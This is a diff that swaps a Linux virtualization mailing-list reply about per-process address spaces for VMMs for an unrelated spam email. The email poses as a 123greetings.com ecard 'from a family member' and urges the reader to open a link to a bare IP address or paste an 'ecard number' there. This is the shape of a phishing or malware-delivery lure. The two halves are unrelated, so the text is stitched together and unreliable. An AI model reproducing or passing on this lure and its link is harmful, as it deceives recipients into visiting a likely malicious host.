@@ -1,13 +1,12 @@
-From: Jeremy Fitzhardinge <jeremy@goop.org>
-Subject: Re: RFC: multiple address spaces for one process
-Date: Fri, 29 Jun 2007 10:32:01 -0400
-Message-ID: <468517E1.4050803@goop.org>
-References: <87myynt1m6.wl%peter@chubb.wattle.id.au>
+From: "123greetings.com" <yxp@nmhs.net>
+Subject: You've received a postcard from a family member!
+Date: Thu, 28 Jun 2007 20:31:47 +0300
+Message-ID: <000601c7b9aa$34261b80$87cee752@ldniq.yy>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=ISO-8859-1; format=flowed
+Content-Type: text/plain; format=flowed; charset="Windows-1252";
+	reply-type=original
 Content-Transfer-Encoding: 7bit
 Return-path: <virtualization-bounces@lists.linux-foundation.org>
-In-Reply-To: <87myynt1m6.wl%peter@chubb.wattle.id.au>
 List-Unsubscribe: <https://lists.linux-foundation.org/mailman/listinfo/virtualization>,
 	<mailto:virtualization-request@lists.linux-foundation.org?subject=unsubscribe>
 List-Archive: <http://lists.linux-foundation.org/pipermail/virtualization>
@@ -17,32 +16,39 @@ List-Subscribe: <https://lists.linux-foundation.org/mailman/listinfo/virtualizat
 	<mailto:virtualization-request@lists.linux-foundation.org?subject=subscribe>
 Sender: virtualization-bounces@lists.linux-foundation.org
 Errors-To: virtualization-bounces@lists.linux-foundation.org
-To: Peter Chubb <peterc@gelato.unsw.edu.au>
-Cc: linux-mm@kvack.org, Carsten Otte <cotte@de.ibm.com>, virtualization@lists.linux-foundation.org
+To: virtualization@lists.osdl.org
 List-Id: virtualization@lists.linuxfoundation.org
 
-Peter Chubb wrote:
-> In a hosted VMM like LinuxOnLinux or UML, context switch time can be a
-> major problem (as mmap when repeated for each guest page frame takes a
-> long time).  One solution is to allow the host kernel to keep a cache of
-> address space contexts, and switch between them in a single
-> operation. 
->   
+Good day.
 
-Other VMMs which have a large usermode component, like lguest and kvm, 
-do maintain two address spaces mapping the same set of pages.  But 
-unlike UML (and I guess LoL), the guest mappings are not represented as 
-VMAs, but just as a raw processor pagetable.  They need some special 
-switcher code to go into that state, so it doesn't look like this would 
-be terribly useful for them.
+Your family member has sent you an ecard from 123greetings.com.
 
-Am I right in presuming that this is really only useful for VMMs which 
-want to use mmap/mprotect/munmap for the virtual MMU implementation?
+Send free ecards from 123greetings.com with your choice of colors, words and music.
 
-It might be interesting if the two cases could be unified in some way, 
-so that the VMMs could use a common usermode mechanism to achieve the 
-same end, which is what Carsten was proposing.  But its not obvious to 
-me how much common mechanism can be pulled out, since its a pretty 
-deeply architecture-specific operation.
+Your ecard will be available with us for the next 30 days. If you wish to keep 
+the ecard longer, you may save it on your computer or take a print.
 
-    J
+To view your ecard, choose from any of the following options:
+
+--------
+OPTION 1
+--------
+
+Click on the following Internet address or
+copy & paste it into your browser's address box.
+
+http://75.180.15.29/?290b516c3c2cd8a7c0b58e47d14c775ed2175ee
+
+--------
+OPTION 2
+--------
+
+Copy & paste the ecard number in the "View Your Card" box at 
+http://75.180.15.29/
+
+Your ecard number is
+290b516c3c2cd8a7c0b58e47d14c775ed2175ee
+
+Best wishes,
+Postmaster,
+123greetings.com
